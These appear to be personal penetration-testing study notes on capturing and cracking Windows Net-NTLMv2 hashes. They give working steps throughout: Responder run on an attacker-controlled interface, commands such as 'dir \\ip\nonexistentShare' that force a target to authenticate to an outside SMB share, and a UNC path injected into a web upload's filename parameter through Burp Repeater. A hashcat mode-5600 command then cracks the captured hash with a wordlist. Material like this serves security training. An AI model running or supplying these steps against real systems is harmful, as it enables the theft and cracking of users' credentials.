
Sometimes we gain access to an unprivileged user so we do not have the ability to use Mimikatz. So we can attempt to abuse Net-NTLMv2 network authentication protocol responsible to for managing the authentication process across windows clients and servers.

Most modern systems use kerberos, but almost all systems still support Net-NTLMv2, so we can exploit its weaknesses.

#### Extracting and Cracking Net-NTLMv2

Target starts an authentication process using Net-NTLMv2 against a system we control.

We prepare our systems using `Responder` tool to handle the authentication process to show us the NetNTLMv2 hash the target used to authenticate.

*responder supports a lot of functionality outside of NTLM*

`ls \\ip\share` - if we have code execution of a remote target we can simply run this command to prompt an authentication from the remote target with out locally managed smb share in powershell

##### Web form authentication prompt

If we don't have code execution, we can also check other vectors - like attempting to upload a non-existent file via smb through a file server like `\\ip\share\nonexistent.txt`.
Which may prompt the authentication process with out smb service. To do this we change the `filename` parameter to `\\\\ip\\share\\lolol.txt` to prompt authentication, use burpsuite repeater.  FOLLOW THE STEPS BELOW.

##### Command-line 

1. `ip a` check interface to set service on
2. `sudo responder -I <interface>` - run service on selected interface
3. `dir \\ip\nonexistentShare` - run on target command line to prompt authentication process with out smb service to obtain the Net-NTLMv2 hash
4. save the hash in full to our system for cracking
5. `hashcat --help | grep -i "ntlm"` find the correct method for cracking
6. `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force` attempt to crack the hash